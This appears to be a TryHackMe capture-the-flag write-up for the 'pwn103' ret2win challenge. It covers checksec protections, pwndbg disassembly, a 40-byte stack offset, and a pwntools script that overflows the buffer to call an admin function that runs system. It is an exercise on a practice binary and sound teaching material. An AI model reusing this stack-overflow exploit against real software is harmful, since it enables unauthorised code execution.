---
title: "pwn103"
date: 2024-01-10
layout: "simple"
categories: [Binary exploitation]
tags: [Tryhackme]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

## 103

### Introduction

Here we are met by a ret2win challenge, what this means is that we are required to call a function which does something that is not normal, example spawn a shell or in case of a CTF it prints out the flag. We can start by doing simple binary analysis for example checking the binary protections using ```checksec```. 

Let us break all this down bit by bit.

``` 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Arch: amd64-64-little
    This line specifies the architecture of the binary. "amd64" refers to the x86-64 architecture, a common architecture for modern desktop and server CPUs. "64-little" indicates that it's a 64-bit architecture (as opposed to 32-bit) and uses little-endian byte ordering.

RELRO: Partial RELRO
    RELRO stands for "RELocation Read-Only." It's a security feature in the ELF (Executable and Linkable Format) binaries (commonly used in Unix-like systems). "Partial RELRO" means that some parts of the binary's memory (like the Global Offset Table - GOT) are protected from certain types of attacks, but not completely. Full RELRO provides more robust protection by making more sections read-only after the program starts.

Stack: No canary found
    A stack canary is a security mechanism used to detect buffer overflows. It's a random value placed before the return address on the stack. "No canary found" means the binary doesn't implement this particular protection, potentially leaving it vulnerable to certain types of buffer overflow attacks.

NX: NX enabled
    NX (No eXecute) is a security feature that prevents code execution from areas of memory marked as data, reducing the risk of certain types of attacks, like buffer overflow attacks that attempt to execute malicious code injected into data areas. "NX enabled" indicates this protection is active, which is a good security measure.

PIE: No PIE (0x400000)
    PIE stands for "Position Independent Executable." When PIE is enabled, the base address of the program is randomized on each execution, making it harder for attackers to predict memory addresses. "No PIE (0x400000)" means the binary is loaded at a fixed address (0x400000 in this case), which might make certain types of attacks easier if other vulnerabilities are present.

Well since we have No Pie, this makes our life much easier since we can pass the address of the "win" function and call it, ret2win. We can also see that we have no canary meaning that we can actually overflow the buffer and over write the adjacent memory. With that said, now we can disassemble the binary. Here I will use be using a debugger to view the functions.

### Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  strncmp@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  read@plt
0x0000000000401080  strcmp@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
0x0000000000401680  __libc_csu_init
0x00000000004016e0  __libc_csu_fini
0x00000000004016e4  _fini
pwndbg> 

```
Interesting enough we can set our focus to this functions first.

```
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
```
So we can see that we have a very interesting functions named admins_only hmm can this be our win function? We can then disassemble this function in our debugger. 

```
pwndbg> disass admins_only 
Dump of assembler code for function admins_only:
   0x0000000000401554 <+0>:	push   rbp
   0x0000000000401555 <+1>:	mov    rbp,rsp
   0x0000000000401558 <+4>:	sub    rsp,0x10
   0x000000000040155c <+8>:	lea    rax,[rip+0x1d04]        # 0x403267
   0x0000000000401563 <+15>:	mov    rdi,rax
   0x0000000000401566 <+18>:	call   0x401040 <puts@plt>
   0x000000000040156b <+23>:	lea    rax,[rip+0x1d0a]        # 0x40327c
   0x0000000000401572 <+30>:	mov    rdi,rax
   0x0000000000401575 <+33>:	call   0x401040 <puts@plt>
   0x000000000040157a <+38>:	lea    rax,[rip+0x1d0e]        # 0x40328f
   0x0000000000401581 <+45>:	mov    rdi,rax
   0x0000000000401584 <+48>:	call   0x401050 <system@plt>
   0x0000000000401589 <+53>:	nop
   0x000000000040158a <+54>:	leave
   0x000000000040158b <+55>:	ret
End of assembler dump.
```

Ah yes we can see that we have a call to system, what this does is call system.
So after we have everything we need we can come up with an exploit. We can first run the binary to see how it runs normaly. 

![5](https://i.ibb.co/DLvBbC0/intro.png)

So going to option 3 we can get a hint that there is where we have the vuln.

We can then disassemble the general function in pwndbg again. 

```
0x00000000004012be <+0>:	push   rbp
   0x00000000004012bf <+1>:	mov    rbp,rsp
   0x00000000004012c2 <+4>:	sub    rsp,0x20
   0x00000000004012c6 <+8>:	lea    rax,[rip+0x10dd]        # 0x4023aa
   0x00000000004012cd <+15>:	mov    rdi,rax
   0x00000000004012d0 <+18>:	call   0x401040 <puts@plt>
   0x00000000004012d5 <+23>:	lea    rax,[rip+0x10e4]        # 0x4023c0
   0x00000000004012dc <+30>:	mov    rdi,rax
   0x00000000004012df <+33>:	call   0x401040 <puts@plt>
   0x00000000004012e4 <+38>:	lea    rax,[rip+0x10fd]        # 0x4023e8
   0x00000000004012eb <+45>:	mov    rdi,rax
   0x00000000004012ee <+48>:	call   0x401040 <puts@plt>
   0x00000000004012f3 <+53>:	lea    rax,[rip+0x111e]        # 0x402418
   0x00000000004012fa <+60>:	mov    rdi,rax
   0x00000000004012fd <+63>:	call   0x401040 <puts@plt>
   0x0000000000401302 <+68>:	lea    rax,[rip+0x1143]        # 0x40244c
   0x0000000000401309 <+75>:	mov    rdi,rax
   0x000000000040130c <+78>:	mov    eax,0x0
   0x0000000000401311 <+83>:	call   0x401060 <printf@plt>
   0x0000000000401316 <+88>:	lea    rax,[rbp-0x20]
   0x000000000040131a <+92>:	mov    rsi,rax
   0x000000000040131d <+95>:	lea    rax,[rip+0x1138]        # 0x40245c
   0x0000000000401324 <+102>:	mov    rdi,rax
   0x0000000000401327 <+105>:	mov    eax,0x0
   0x000000000040132c <+110>:	call   0x4010a0 <__isoc99_scanf@plt>
   0x0000000000401331 <+115>:	lea    rax,[rbp-0x20]
   0x0000000000401335 <+119>:	lea    rdx,[rip+0x1123]        # 0x40245f
   0x000000000040133c <+126>:	mov    rsi,rdx
   0x000000000040133f <+129>:	mov    rdi,rax
   0x0000000000401342 <+132>:	call   0x401080 <strcmp@plt>
   0x0000000000401347 <+137>:	test   eax,eax
   0x0000000000401349 <+139>:	jne    0x401366 <general+168>
   0x000000000040134b <+141>:	lea    rax,[rip+0x1111]        # 0x402463
   0x0000000000401352 <+148>:	mov    rdi,rax
   0x0000000000401355 <+151>:	call   0x401040 <puts@plt>
   0x000000000040135a <+156>:	mov    eax,0x0
   0x000000000040135f <+161>:	call   0x40158c <main>
   0x0000000000401364 <+166>:	jmp    0x401375 <general+183>
   0x0000000000401366 <+168>:	lea    rax,[rip+0x1112]        # 0x40247f
   0x000000000040136d <+175>:	mov    rdi,rax
   0x0000000000401370 <+178>:	call   0x401040 <puts@plt>
   0x0000000000401375 <+183>:	nop
   0x0000000000401376 <+184>:	leave
   0x0000000000401377 <+185>:	ret

```
We then need to determine the offset for the buffer at runtime. To do this, I first located the scanf and the buffer which handled all instrunctions. Considering that ```rbp-0x20``` is the buffer, which in bytes is 32. This means that the buffer is ```0x20``` or 32 bytes below the base pointer.

We would now need to overwrite the return address of ```general``` function that was put onto the stack and make it return to our win function instead. In order to reach our return address we would need 8 more bytes making them 40 in total

### Exploit


```
from pwn import *

p = process("./pwn103.pwn103") 
#p = remote("thm_ip", 9003)

admins_addr = p64(0x401554) 
return_addr = p64(0x401677)

payload = b'A' * 40 # found buffer at 40
payload += return_addr
payload += admins_addr

pause()

p.sendlineafter(":", "3")
p.sendline(payload)
p.interactive()

```
Here, ```admins_addr``` and ```return_addr``` are two addresses in the binary, represented as 64-bit packed values (p64). The return function serves as the address the program will attempt to return to after completing a function call.
The payload starts with 40 bytes of 'A's to fill the buffer until a potential buffer overflow point is reached. Then, it appends the return_addr followed by admins_addr in an attempt to redirect program execution to the admins_addr after overwriting the return address.

```pause()``` is used to pause the script execution, giving you time to attach a debugger if needed before the interaction with the vulnerable program begins.
```sendlineafter()``` sends the string "3" to the program, which directs the program to the general channel where we found the vuln hint.
```p.interactive()``` hands over the control of the program to you interactively, allowing you to send further commands manually and explore the program's state after the exploit attempt.
